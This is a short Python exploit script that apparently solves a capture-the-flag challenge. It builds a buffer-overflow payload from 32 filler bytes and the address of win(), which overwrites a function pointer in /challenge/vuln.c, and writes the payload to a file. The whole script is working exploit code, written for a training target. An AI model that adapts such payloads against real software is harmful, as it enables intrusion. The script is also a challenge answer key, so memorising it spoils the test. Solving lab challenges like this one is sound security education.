from pwn import p64, ELF, context
import subprocess

# Primitiva: sobrescrever o ponteiro de funcao `handler` para apontar a win().
# Compilamos o mesmo fonte com -no-pie para ler o endereco de win() de forma
# deterministica (o binario do /challenge/check tera o mesmo endereco).
context.log_level = "error"
subprocess.run(
    ["gcc", "-O0", "-fno-stack-protector", "-no-pie",
     "/challenge/vuln.c", "-o", "/tmp/vuln_solve"],
    check=True,
)
elf = ELF("/tmp/vuln_solve")
win = elf.symbols["win"]

payload = b"A" * 32 + p64(win)
open("/home/hacker/payload.bin", "wb").write(payload)
